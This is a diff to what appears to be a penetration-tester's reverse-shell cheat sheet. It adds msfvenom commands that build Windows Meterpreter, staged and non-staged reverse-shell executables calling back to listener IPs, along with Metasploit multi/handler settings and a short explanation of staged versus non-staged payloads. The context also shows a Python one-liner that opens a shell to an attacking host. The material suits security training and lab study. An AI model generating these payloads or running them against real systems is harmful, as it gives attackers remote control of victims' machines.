@@ -9,7 +9,50 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 ## Msfvenom
 
-There is more info on this topic in the metasploit chapter in /exploiting. But here goes
+There is more info on this topic in the metasploit chapter in /exploiting.
+
+Therse is an important difference between non-staged and staged payload. A **non-staged** shell is sent over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler. But also with netcat.
+
+**staged** shells send them in turn. This can be useful for when you have very small buffer for your shellcode, so you need to divide upp the payload. Meterpreter is a staged shell. First it sends some parts of it and sents up the connetion, and then it sends some more. This can be caught with metasploit multi-handlet but not with netcat.
+
+
+
+### Windows
+
+#### Meterpreter
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.191 LPORT=445 -f exe -o shell_reverse.exe
+```
+
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+```
+
+#### Non-staged payload
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe
+```
+
+```
+use exploit/multi/handler
+set payload windows/shell_reverse_tcp
+```
+
+#### Staged payload
+
+```
+msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe
+```
+
+This must be caught with metasploit. It does not work with netcat.
+
+```
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+```
 
 
 ## Bash
@@ -108,3 +151,4 @@ p.waitFor()
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+
